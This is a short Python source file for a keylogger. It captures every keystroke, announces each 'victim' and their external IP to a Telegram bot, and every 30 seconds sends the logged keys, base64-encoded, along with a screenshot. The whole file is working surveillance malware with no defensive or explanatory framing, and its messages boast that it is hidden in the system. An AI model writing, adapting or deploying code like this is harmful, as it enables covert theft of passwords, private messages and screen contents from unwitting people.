import threading
import time
from pynput import keyboard
from bot_utils import get_external_ip, image_to_base64, text_to_base64
from telegram_bot import send_message, send_photo_base64

keylogs = []
lock = threading.Lock()

def on_press(key):
    try:
        k = key.char
    except AttributeError:
        k = str(key)
    with lock:
        keylogs.append(k)

def send_initial_message():
    ip = get_external_ip()
    msg = f"🕵️‍♂️ *Victim Keylogged!*\nIP: `{ip}`\nScript successfully encrypted and hidden in the system ✅"
    send_message(msg)

def send_logs_and_screenshot():
    while True:
        time.sleep(30)  

        with lock:
            if not keylogs:
                continue
            text = "".join(keylogs)
            keylogs.clear()
            
        encoded_text = text_to_base64(text)

        img_base64 = image_to_base64()
        
        send_message(f"⌨️ Logs (last 30s) in Base64:\n`{encoded_text}`")
        if img_base64:
            send_photo_base64(img_base64, caption="🖼️ Screenshot (last 30s)")

def main():
    
    send_initial_message()

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    send_logs_and_screenshot()

if __name__ == "__main__":
    main()
